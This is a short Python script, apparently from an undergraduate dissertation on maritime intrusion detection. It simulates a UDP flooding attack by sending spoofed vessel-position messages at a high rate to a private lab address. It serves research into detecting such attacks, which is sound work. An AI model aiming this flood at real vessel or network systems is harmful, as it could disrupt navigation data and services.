"""
Script: Flooding Attack
Description: Generates high-frequency network traffic to simulate a flooding attack.
This script significantly increases packet transmission rate to create abnormal traffic volume.
"""
# Developed as part of an undergraduate dissertation on maritime intrusion detection

#Imports
import socket
import time
import random
from datetime import datetime

# Target IP and port
BRIDGE_IP = "192.168.56.15"
PORT = 5005

# Runtime control
DURATION_SECONDS = 90    # 1.5 minutes

# Create UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Initial vessel position
lat = 51.517
lon = -0.131

# Sequence number
seq = 0

# End time
end_time = time.time() + DURATION_SECONDS

while time.time() < end_time:
    # Small movement retained, but focus is on transmission rate
    lat += random.uniform(-0.001, 0.001)
    lon += random.uniform(-0.001, 0.001)

    seq += 1
    timestamp = datetime.utcnow().isoformat()

    message = f"""
VESSEL_ID:Vessel_001
LAT:{lat:.6f}
LON:{lon:.6f}
SEQ:{seq}
TIME:{timestamp}
MSG_TYPE:POSITION_UPDATE
"""

    # Random payload padding
    message += "X" * random.randint(10, 40)

    # Send UDP packet
    sock.sendto(message.encode(), (BRIDGE_IP, PORT))

    # Very short delay for high packet rate
    time.sleep(random.uniform(0.01, 0.03))

print("Flood attack generation complete.")
sock.close()
